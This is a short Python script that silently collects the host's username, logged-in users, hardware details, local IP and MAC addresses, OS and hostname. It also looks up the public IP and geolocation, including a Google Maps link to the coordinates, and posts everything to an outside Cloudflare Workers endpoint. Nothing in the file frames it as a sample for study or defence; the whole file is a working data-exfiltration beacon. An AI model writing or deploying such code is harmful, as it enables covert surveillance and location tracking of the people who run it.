#!py_env/bin/python3
import sys
import json
import socket
import psutil
import pathlib
import getpass
import platform
import datetime
import requests
exe = pathlib.Path(sys.executable).name
def get_ip():
    try:
        ipv4 = []
        ipv6 = []
        mac = []
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4.append(addr.address)
                elif addr.family == socket.AF_INET6:
                    ipv6.append(addr.address)
                elif addr.family in (psutil.AF_LINK, getattr(socket, "AF_PACKET", None)):
                    mac.append(addr.address)
        return ipv4, ipv6, mac
    except Exception as e:
        return str(e)
def public_ip():
	req = requests.get("https://api64.ipify.org/")
	if req.status_code == 200:
		return req.text
	else:
		return req.status_code
def ip_info():
	r = requests.get("http://ip-api.com/json/")
	if r.status_code == 200:
		j = json.loads(r.text)
		return j
	return None
time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
i = get_ip()
i_info = ip_info()
payload = f"""
Execution time: {time}

User: {getpass.getuser()}

Logged Users: {psutil.users()}

CPU: {psutil.cpu_count()}

CPU Frequency: {psutil.cpu_freq()}

RAM: {psutil.virtual_memory().total // 1024 // 1024 // 1024}GB

Public IP: {public_ip()}

Country: {i_info['country']}

Region: {i_info['regionName']}

City: {i_info['city']}

ISP: {i_info['isp']}

Organization: {i_info['org']}

Alias: {i_info['as']}

IPv4: {str(i[0]).replace("[","").replace("]","")}

IPv6: {str(i[1]).replace("[","").replace("]","")}

MAC: {str(i[2]).replace("[","").replace("]","")}

System: {platform.system()}

Node: {platform.node()}

Version: {platform.release()}

Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}
"""
content = json.dumps({"msg": payload})
r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
if r.status_code == 200:
	print("sended", exe)

